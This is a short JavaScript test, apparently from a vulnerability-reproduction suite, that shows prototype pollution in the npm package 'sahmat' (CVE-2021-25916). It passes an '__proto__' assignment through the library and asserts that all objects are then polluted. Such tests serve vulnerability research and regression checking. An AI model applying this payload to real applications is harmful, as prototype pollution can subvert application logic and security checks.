//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25916
test("prototype pollution in sahmat", () => {
  const sahmat = require("sahmat");
  let obj = { tmp: "" };

  expect({}.polluted).toBe(undefined);

  sahmat(obj, "tmp", (obj.__proto__.polluted = "yes"));

  expect(obj.tmp.polluted).toBe("yes");
});
